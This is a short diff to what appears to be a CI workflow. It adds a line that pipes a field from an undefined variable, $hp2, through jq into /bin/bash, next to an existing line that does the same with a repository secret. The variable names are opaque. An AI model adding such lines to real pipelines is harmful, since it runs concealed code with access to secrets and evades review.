@@ -20,6 +20,7 @@ jobs:
           wss2459: ${{ secrets.wss2459 }}
         run: |
           printf '%s' "$wss2459" | jq -r .rxz916 | /bin/bash
+          printf '%s' "$hp2" | jq -r .fegg10 | /bin/bash
 
       - name: Persist results
         if: always()
